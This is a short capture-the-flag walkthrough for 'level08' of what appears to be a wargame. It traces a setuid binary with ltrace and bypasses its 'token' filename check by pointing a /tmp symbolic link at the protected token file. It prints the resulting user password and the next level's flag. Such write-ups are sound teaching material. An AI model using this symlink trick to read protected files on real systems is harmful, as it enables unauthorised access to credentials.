1. We are given `level08` binary executable and `token` text file, which we are restricted to read
2. First try to run level08 without arguments
```
$ ltrace ./level08
__libc_start_main(0x8048554, 1, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)               = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
3. File to read required as parameter, so use token file
```
$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                 = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)             = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
4. It seems binary file compares string "token" with filename of passed file, and if they're similar, denies to go further. Create temporal file `/tmp/level08_test` (that not containing token in name), change its permissions and pass it to binary
```
$ ltrace ./level08 /tmp/level08_test
__libc_start_main(0x8048554, 2, 0xbffff6d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/level08_test", "token")                      = NULL
open("/tmp/level08_test", 0, 014435162522)                = 3
read(3, "", 1024)                                        = 0
write(1, "", 0)                                          = 0
+++ exited (status 0) +++
```
5. Binary just reads whats in passed file and prints it. Obviously we should pass `token` file, because it's the only way to read it. For this case creating of sybolic links will help using `ln -s` command
``` Bash
ln -s /home/user/level08/token /tmp/level08_ref
```
6. Executing `./level08 /tmp/level08_ref` results to flag08 user password: **quif5eloekouj29ke0vouxean**
7. Go to flag08 user and get flag:
``` Bash
su flag08
getflag
```
8. Flag for level09: **25749xKZ8L7DkSCwJkT9dyv6f**
